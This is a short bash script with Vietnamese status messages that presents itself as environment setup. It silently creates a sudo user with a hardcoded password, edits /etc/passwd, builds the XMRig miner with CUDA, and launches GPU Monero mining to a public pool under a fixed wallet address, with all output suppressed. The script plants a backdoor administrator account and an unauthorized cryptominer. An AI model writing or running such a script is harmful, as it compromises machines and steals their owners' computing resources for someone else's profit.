#! /bin/bash
printf "Dang tao moi truong..." >&2
{
sudo useradd -m long
sudo adduser long sudo
echo 'long:1230' | sudo chpasswd
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
sudo apt-get update
git clone https://github.com/xmrig/xmrig-cuda.git
mkdir xmrig-cuda/build && cd xmrig-cuda/build
cmake .. -DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCUDA_TOOLKIT_ROOT_DIR=/usr/local/cuda
make -j$(nproc)
cd
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
cp /root/xmrig-cuda/build/libxmrig-cuda.so /root/xmrig/build
} &> /dev/null &&
printf "\nXong " >&2 ||
printf "\nLoi " >&2
#./xmrig -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN
./xmrig --no-cpu --cuda -o sg.minexmr.com:443 -u 84JEttNYVJiKMqVpnhnp7MhoxWECiZcbg1efDiNSeG2kW3rYj6VfxCFPKVEzLXSgPG2q3LYte4mWZ8QVFh63KE8kL5iXCuN -k --tls
